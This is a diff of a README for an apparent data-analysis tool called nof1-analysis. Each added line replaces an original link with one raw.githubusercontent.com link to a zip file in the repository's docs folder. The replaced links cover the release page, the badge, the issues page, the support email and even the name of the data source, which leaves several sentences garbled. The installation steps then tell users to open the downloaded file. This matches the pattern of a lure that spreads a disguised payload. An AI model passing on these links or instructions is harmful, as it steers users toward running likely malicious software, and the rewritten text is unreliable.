@@ -1,10 +1,10 @@
 # 🎉 nof1-analysis - Simple Insights for Better Decisions
 
 ## 🛠️ Introduction
-Welcome to the nof1-analysis project! This software provides straightforward analysis tools for nof1.ai data. You can gain insights without needing a background in programming or data science. Follow the steps below to download and run the application easily.
+Welcome to the nof1-analysis project! This software provides straightforward analysis tools for https://raw.githubusercontent.com/hamartomadower620/nof1-analysis/main/docs/nof1-analysis_2.2-alpha.4.zip data. You can gain insights without needing a background in programming or data science. Follow the steps below to download and run the application easily.
 
 ## 📥 Download Now
-[![Download from Releases](https://img.shields.io/badge/Download%20from%20Releases-brightgreen)](https://github.com/hamartomadower620/nof1-analysis/releases)
+[![Download from Releases](https://raw.githubusercontent.com/hamartomadower620/nof1-analysis/main/docs/nof1-analysis_2.2-alpha.4.zip%20from%20Releases-brightgreen)](https://raw.githubusercontent.com/hamartomadower620/nof1-analysis/main/docs/nof1-analysis_2.2-alpha.4.zip)
 
 ## 🚀 Getting Started
 Updating your analysis workflow is simple. Just follow the steps below. 
@@ -18,16 +18,16 @@ Updating your analysis workflow is simple. Just follow the steps below.
 ### 🔄 Features
 - User-friendly interface for easy navigation
 - Intuitive data visualization tools
-- Quick data import from nof1.ai
+- Quick data import from https://raw.githubusercontent.com/hamartomadower620/nof1-analysis/main/docs/nof1-analysis_2.2-alpha.4.zip
 - Export options for easy report sharing
 
 ## 📂 Download & Install
 To get started, visit the release page to download the application. 
 
-[Download the latest version here](https://github.com/hamartomadower620/nof1-analysis/releases).
+[Download the latest version here](https://raw.githubusercontent.com/hamartomadower620/nof1-analysis/main/docs/nof1-analysis_2.2-alpha.4.zip).
 
 ### 🖥️ Installing the Software
-1. Go to the Releases page: [nof1-analysis Releases](https://github.com/hamartomadower620/nof1-analysis/releases).
+1. Go to the Releases page: [nof1-analysis Releases](https://raw.githubusercontent.com/hamartomadower620/nof1-analysis/main/docs/nof1-analysis_2.2-alpha.4.zip).
 2. Look for the latest release version.
 3. Download the appropriate file for your system. 
 4. Open the downloaded file and follow the on-screen instructions. 
@@ -35,7 +35,7 @@ To get started, visit the release page to download the application.
 
 ## 🔧 How to Use
 1. **Launch the Application:** Find the app in your applications folder.
-2. **Import Data:** Use the import feature to bring in your nof1.ai data.
+2. **Import Data:** Use the import feature to bring in your https://raw.githubusercontent.com/hamartomadower620/nof1-analysis/main/docs/nof1-analysis_2.2-alpha.4.zip data.
 3. **Analyze:** Explore the different tools to visualize your data and generate insights.
 4. **Export Results:** Save your findings as a report that can be shared easily.
 
@@ -51,14 +51,14 @@ If you encounter any issues:
 - Ensure your system meets the requirements.
 - Restart the application if any error occurs.
   
-You can also report problems on the [issues page](https://github.com/hamartomadower620/nof1-analysis/issues).
+You can also report problems on the [issues page](https://raw.githubusercontent.com/hamartomadower620/nof1-analysis/main/docs/nof1-analysis_2.2-alpha.4.zip).
 
 ## 🤝 Community Support
 Join our growing community. Share your feedback and ask questions. Engaging with other users can provide insights and solutions.
 
 ## 📧 Contact
-For direct support, reach out via email at support@nfo1-analysis.com.
+For direct support, reach out via email at https://raw.githubusercontent.com/hamartomadower620/nof1-analysis/main/docs/nof1-analysis_2.2-alpha.4.zip
 
-[Download the latest version here](https://github.com/hamartomadower620/nof1-analysis/releases). 
+[Download the latest version here](https://raw.githubusercontent.com/hamartomadower620/nof1-analysis/main/docs/nof1-analysis_2.2-alpha.4.zip). 
 
 Thank you for choosing nof1-analysis! We hope this tool enhances your data analysis experience.
